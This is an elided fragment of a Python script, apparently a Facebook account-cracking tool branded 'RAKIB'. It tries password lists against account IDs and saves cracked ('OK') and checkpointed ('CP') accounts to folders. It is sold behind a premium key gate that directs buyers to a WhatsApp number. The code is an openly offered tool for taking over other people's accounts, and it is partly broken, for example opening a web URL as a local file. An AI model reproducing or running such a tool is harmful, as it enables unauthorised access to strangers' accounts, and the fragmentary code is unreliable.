...
def banner():
 ...
 #    #  #    # #   #  # #    # 
 #     # #    # #    # # #####  
                                ------------------------------------------------\n \n \x1b[1;93m(*)\x1b[1;95m Auther    : MR RAKIB  \n \x1b[1;93m(*)\x1b[1;93m FB        :MD RAKIB HOSSEN\n \x1b[1;93m(*)\x1b[1;95m Tool Name : RAKIB \n \x1b[1;93m(*)\x1b[1;91m Github    :MRRAKIB-404\n\x1b[1;97m------------------------------------------------" | lolcat')
        print("") 
            ...
            for i in fl.get("pw"):
                ...
                if log.get("status")=="cp":
                    ...
                    if fl.get("id") in files_cp:pass
                        ...
                        h_cp = "\r %s[%sRAKIB-CP%s] %s • %s%s%s          "%(K,P,K,fl.get("id"),i,ttll,tahun(fl.get("id")));cek_opsi(fl.get("id"),i,h_cp)
                    ...
                    files_ok = "RAKIB-OK/%s.txt"%(tanggal)
...
def result():
    ...
    if ch in ['']:jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));menu()
        ...
        try:
            okl = os.listdir("RAKIB-OK");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN OK FILE %s]'%(H,P,H));print('%s '%(O))
            ...
            try:
                ppp = _azimvau_dapunta_("RAKIB-OK/%s"%(files)).read().splitlines()
        ...
        try:
            cpl = os.listdir("RAKIB-CP");print('%s '%(O));print('%s [%s CRACK RESULTS STORED IN CP FILES %s]'%(H,P,H));print('%s '%(O))
            for file in cpl:print('%s [%s•%s] %s%s'%(H,P,H,K,file))
            print('%s '%(O));files = _cici_azimvau_('%s [%s•%s] %sENTER FILE NAME : '%(H,P,H,K));print('')
            if files == "":jalan('%s [%s!%s] %sINCORRECT CONTENT'%(M,P,M,P));result()
            try:
                ppp = _azimvau_dapunta_("RAKIB-CP/%s"%(files)).read().splitlines()
...
def folder():
    try:os.mkdir("RAKIB-CP")
    except:pass
    try:os.mkdir("RAKIB-OK")
    except:pass
...
def genkey():
	try:
		...
		subprocess.check_output(["am", "start", "https://wa.me/+9660531382117"])
		exit()
	except(IOError):
		rb = rx
		...
		banner()
		psb('       %s》%s》%s》%sPOWER OF RAKIB%s《%s《%s《'%(M,H,B,H,B,H,M))
		print("\n\033[0;91m              YOU ARE NOT PREMIUM USER ")
		print("\033[0;91m           FIRST BUY PREMIUM KEY FROM OWNER")
		print("\033[0;91m.          PAYMENT CANT BE UNDONE")
		print("\033[0;91m.          CHANGE USER AGENT IF CP IDS CAME")
...
def keycheck():
    try:
        k = open(" https://github.com/MRRAKIB-404/key-approve-/blob/main/appro.txt").read()
